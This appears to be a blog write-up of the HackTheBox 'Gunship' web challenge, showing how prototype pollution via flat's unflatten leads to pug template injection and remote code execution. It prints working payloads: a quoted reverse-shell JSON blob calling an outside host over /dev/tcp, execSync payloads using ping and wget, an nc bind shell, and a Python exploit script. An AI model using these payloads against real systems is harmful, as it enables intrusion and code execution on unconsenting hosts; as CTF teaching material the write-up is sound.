---
layout: post
title: "HTB: Gunship Challenge"
date: 2022-08-23 18:07 +0100
tags: hackthebox htb nodejs hacking
categories: [Pentesting, HackTheBox]
published: true
---

1. [Enumeration](#enumeration)
2. [Testing](#testing)
3. [Exploitation](#exploitation)
4. [Local vs Live](#local-vs-live)

```bash
Type: Web
OS: Linux
Rating: Very Easy
```

Nice little challenge this one, we do a bit of digging and find some clues that lead us to an article that contains an exploit for one of the technologies used in the application, and then it's a case of triggering the vulnerability locally, and then figuring out what the payload needs to be for the live environment.

---

## Enumeration

First things first, launch an instance and play around with the application to get an idea of what you're dealing with.

It's ostensibly a single page website setup to advertise a band who's name surely inspired the name of the machine, Gunship. There is an input form at the bottom where we're encouraged to enter our favourite band name.

We can enter some random garbage into the input form, but we only ever get the same "Please provide us with the full name of an existing member" message and can't make it crash or throw any crazy errors.

So, simple one page website, when we submit a thing it puts it in a JSON block which is sent up to the server.

Download the source code from the challenge link and unzip it with the password `hackthebox` and you're greeted by the following folder structure and files:

```bash
.
├── build-docker.sh
├── challenge
│   ├── flag
│   ├── index.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── css
│   │   │   └── main.css
│   │   ├── images
│   │   │   └── favicon.png
│   │   └── js
│   │       └── main.js
│   ├── views
│   │   └── index.html
│   └── yarn.lock
├── config
│   └── supervisord.conf
├── Dockerfile
└── entrypoint.sh

8 directories, 13 files
```

The main files of interest are the `main.js` and `index.js` files, we can also check out the `package.json` which will tell us which packages are being used in this application (which is NodeJS if you hadn't worked it out yet)

```bash
---SNIP---
	"dependencies": {
		"express": "^4.17.1",
		"flat": "5.0.0",
		"pug": "^3.0.0"
	}
---SNIP---
```

The `pug` module/library is of interest and we can find some really interesting information with a Google search `npm pug exploit`, but there doesn't seem to be much in the way of POC for the RCE vulnerabilities that pop up, so we'll just put a pin in that and move on to reviewing the rest of the source code.

> High speed, low drag - U.S. Army Motto
{: .prompt-tip }

After reviewing the source code we can discount `challenge/index.js`, it's mostly just setting up some basic routes and the default 404 error message, `challenge/static/js/main.js` doesn't really have anything of note (from a vulnerability standpoint) and is just setting up an endpoint called `/api/submit` which accepts `POST` requests populated by a form element, which we can safely assume is the input form on the website.

The one we want to take a real close look at is `challenge/routes/index.js`.

```js
const path              = require('path');
const express           = require('express');
const pug        		= require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
		return res.json({
			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
		});
	} else {
		return res.json({
			'response': 'Please provide us with the full name of an existing member.'
		});
	}
});

module.exports = router;
```

`const { artist } = unflatten(req.body);` is really interesting, mostly because at the time I had no idea what the `unflatten` function did.

Head over to Google, and start typing `nodejs unflatten` and you'll see that one of the suggested searches is `nodejs unflatten exploit`, which leads us to the [this post](https://blog.p6.is/AST-Injection/) which tells us that the "AST" templates that are used in NodeJS, if the application is vulnerable to [Prototype Pollution](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), are vulnerable to Remote Code Execution if you pass it a crafted payload.

If you recall back to earlier, we reviewed the `package.json` and saw that `pug` was vulnerable to a Remote Code Execution vulnerability but we couldn't immediately find an exploit for it... well we just found the exploit which is essentially the following JSON blob:

```bash
{
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
}
```

As the vulnerabilities we saw earlier suggested, there is an issue in the way that templates are managed in NodeJS and subsequently in the compiler `pug` uses parses values, you can read more about it on the linked post, but it effectively boils down to the following quote, and the JSON blob above:

> Any AST can be inserted in the function by making it insert during the Parser or Compiler process.
{: .prompt-info }

## Testing

To actually test this before smashing the live instance with all kinds of payloads we can run it locally using the provided Docker image.

```bash
docker build -t htb/gunship .

# I recommend not running in "daemon" mode (-d) so you can actually see error messages
docker run --rm -p 1337:1337 htb/gunship
```

Once that's up and running we have a nice refreshable environment to test in, just hit Ctrl+C or run `docker stop <image-name>` to close and then just reopen.

If you're feeling fancy and you plan to be working from the terminal, scripting and/or using things like `curl` to figure this one out, then you might want to proxy your whole command line to BurpSuite so you can see what's being sent up and make corrections where necessary. You can do this with the following lines in your Bash terminal:

```bash
export http_proxy="127.0.0.1:8080"
export https_proxy="127.0.0.1:8080"
```

Now that we're all setup we can get into actually doing some exploiting.

## Exploitation

I'll cover two methods, one is essentially just an automated version of the other, but it's nice to see things being done in multiple ways, and the programatic way tends to reveal a bit more of the method behind the exploit.

If you've also not quite figured out what's going on, we're abusing an exploit called "Prototype Pollution", there is a really good paper linked above somewhere if you want to dig a bit deeper. I can't *really* TL;DR it because it's a dense subject, but it comes down to a quirk of JavaScript whereby all objects have this thing called a `prototype`, which tells the JS runtime engine which functions are available to that object, so far so good. The quirk lies in the fact that this `prototype` is not a static thing and at any point new functions can be added, modified or removed, and that's what we're abusing. We're going to inject a bit of JSON into the runtime process that forces the compiler to accept input from a new function that does something within our control.

### BurpSuite (Manual Method)

The BurpSuite method is the simplest one, we fire up Burp turn on the Proxy Intercept, open up the inbuilt browser and capture the request to the `/api/submit` endpoint, which initially looks something like this:

```bash
POST /api/submit HTTP/1.1
Host: localhost:1337
Content-Length: 22
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Linux"
Content-Type: application/json
Accept: */*
Origin: http://localhost:1337
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:1337/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=qzlEeMamvRr5owgNVW2A4pHZTRiJ5S2vujjIY4srRA7p4QbZ8BxKL9D3OkP1
Connection: close

{"artist.name":"blah"}
```

From the source code we know we need to use either `Westaway`, `Haigh`, or `Gingell` as names to trigger a positive response from the application, and we know that the `pug.compile` function is only occuring when the application returns that positive response as we've seen it in the code `challenges/routes/index.js` (line 16)

We've already figured out that the `pug` package is vulnerable and extracted the exploit we want to use, all we have to do is modify it to our purposes, with the known caveat that we have to make the application give a positive response:

```json
{
	"artist.name":"Haigh","__proto__.block": {
	"type": "Text", 
	"line": "process.mainModule.require('child_process').execSync(`ping -c 3 172.17.0.1`)"
	}
}
```

If we replace the `{"artist.name":"blah"}` from the previous request with the one above we should be able to ping our host machine.

Setup a listener with `tcpdump` *then* fire off the payload

```bash
# Capture ICMP traffic on docker0 interface
sudo tcpdump icmp -i docker0
```

And it fails... because we're not root on the Docker image apparently... which is a good error message to see, because it means that we're getting code execution, but an error is still an error and it's preventing us from progressing.

So we resort to `wget` which produces a much more positive result instantly.

```bash
╔ bullsec@capstone:~/HTB_Gunship
╚ »»» sudo nc -lvnp 80
Listening on 0.0.0.0 80
Connection received on 172.17.0.2 59244
GET /adada HTTP/1.1
Host: 172.17.0.1
User-Agent: Wget
Connection: close

```

From here we know we have full command execution so it's just a case of figuring out a more malicious/effective payload.

Digging around on the Docker image and we can see that (for some reason) it has `nc` installed, so we can get a Bind shell back to our host machine (since we didn't setup proper port forwarding on the Docker image other than 1337):

```bash
# Change the payload to contain the following line
nc -lvp 1448 -e /bin/sh
```

Fire that off, and then on the host machine we simply need to connect to the newly opened port and we get our shell:

```bash
nc 172.17.0.2 1448
```

### Python Script (Automated Method)

Really simple script, just going to establish a few variables including our payload, then make a call to the site using the `requests` libary and then check the status code, even though that's a bit deceptive as the application will now start throwing a 500 for things like "file not found", so it's not 100% reliable and you probably want to `print` the `req.text` but I like making things more difficult for myself apparently.

```python
import requests

URL = "http://localhost:1337"
#URL = "http://"

payload ={
	"artist.name":"Haigh","__proto__.block": {
	"type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`wget http://172.17.0.1/addasd`)"
	}
}


req = requests.post(URL+"/api/submit", json=payload)
print(req.status_code)
```

Make sure you have something listening for that incoming connection like `nc` or a python web server to confirm it fired off and you should have a nice little template to mess around and try and get yourself a shell.

## Local vs Live

The live environment differs from the local Docker environment in that you won't be able to directly route back to your own machine as you are (more than likely) sat behind a NAT network and don't have a static internet facing IP to route the traffic back to. That's not a problem, we just have to figure out a different payload, one that doesn't involve a reverse shell.

Since we already have a fairly established payload, all we need to do is modify the command we're passing across to be something a bit more suited to the probably constraints (i.e. NAT'ed connections and firewalls)

```json
{
	"artist.name":"Haigh","__proto__.block": {
	"type": "Text", 
	"line": "process.mainModule.require('child_process').execSync(`cp flag* static/test.txt`)"
	}
}
```

Don't reinvent the whell, just do something simple.

The above payload makes a copy of `flag*` (it's `flag*` because the name is random, but there is only one, which can be observed in the Docker image) and creates a new text file in `static/` called `test.txt` which we can then just curl for or browse to (dealers choice) to retreive our flag.

> The Bind Shell method probably works btw, I just couldn't be bothered testing it on the live instance but in theory it should work fine (in theory).
{: .prompt-info }

And after all of that you get a flag, which I'm not going to print because that would mean you could just say you've done it and that's no fun.

Enjoy,
